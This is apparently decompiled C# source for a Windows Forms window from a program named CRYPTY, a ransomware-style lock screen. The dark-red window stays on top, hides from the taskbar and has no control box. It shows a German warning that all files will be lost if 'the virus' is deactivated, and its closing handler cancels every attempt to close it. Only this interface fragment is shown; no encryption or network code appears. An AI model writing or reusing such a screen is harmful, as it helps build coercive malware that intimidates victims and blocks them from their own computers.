using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace CRYPTY;

[DesignerGenerated]
public class mainFrame : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("title")]
	internal virtual Label title
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public mainFrame()
	{
		((Form)this).add_Closing((CancelEventHandler)delegate(object sender, CancelEventArgs e)
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Expected O, but got Unknown
			mainFrame_Closing(RuntimeHelpers.GetObjectValue(sender), (FormClosingEventArgs)e);
		});
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Expected O, but got Unknown
		Label1 = new Label();
		title = new Label();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Consolas", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_Location(new Point(12, 104));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(790, 48));
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("Hinweis:\r\nSollte der Virus deaktiviert werden, gehen alle Dateien verloren.");
		title.set_AutoSize(true);
		((Control)title).set_Font(new Font("Consolas", 48f, (FontStyle)5, (GraphicsUnit)3, (byte)0));
		((Control)title).set_Location(new Point(12, 9));
		((Control)title).set_Name("title");
		((Control)title).set_Size(new Size(242, 75));
		((Control)title).set_TabIndex(1);
		title.set_Text("CRYPTY");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.DarkRed);
		((Control)this).set_CausesValidation(false);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)title);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).set_Cursor(Cursors.get_No());
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Control)this).set_Name("mainFrame");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void mainFrame_Closing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}
}
